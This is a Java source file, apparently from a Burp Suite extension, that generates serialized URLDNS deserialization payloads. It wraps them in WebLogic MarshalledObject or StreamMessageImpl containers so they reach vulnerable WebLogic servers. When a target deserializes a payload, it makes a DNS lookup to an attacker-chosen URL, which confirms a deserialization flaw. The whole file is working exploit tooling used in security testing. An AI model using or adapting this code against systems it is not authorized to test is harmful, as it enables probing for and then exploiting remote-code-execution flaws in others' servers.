package burp;

import weblogic.corba.utils.MarshalledObject;
import weblogic.jms.common.StreamMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {

    private static Object getObject(final String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
    }

    private static Object marshalledObject(Object payload) {
        MarshalledObject marshalledObject = null;
        try {
            marshalledObject = new MarshalledObject(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return marshalledObject;
    }

    private static Object streamMessageImpl(byte[] payload) {
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(payload, payload.length);
        return streamMessage;
    }

    public static byte[] getPayloadBytes(String url) throws Exception {
        final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
        objOut.writeObject(getObject(url));
        objOut.flush();
        objOut.close();
        return byteOut.toByteArray();
    }

    public static byte[] getPayloadBytes(String url, String type) throws Exception {
        final ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
        if (type.equalsIgnoreCase("marshall")) {
            objOut.writeObject(marshalledObject(getObject(url)));
        } else if (type.equalsIgnoreCase("streamMessageImpl")) {
            byte[] origPayload = getPayloadBytes(url);
            objOut.writeObject(streamMessageImpl(origPayload));
        } else
            objOut.writeObject(getObject(url));
        objOut.flush();
        objOut.close();
        return byteOut.toByteArray();
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
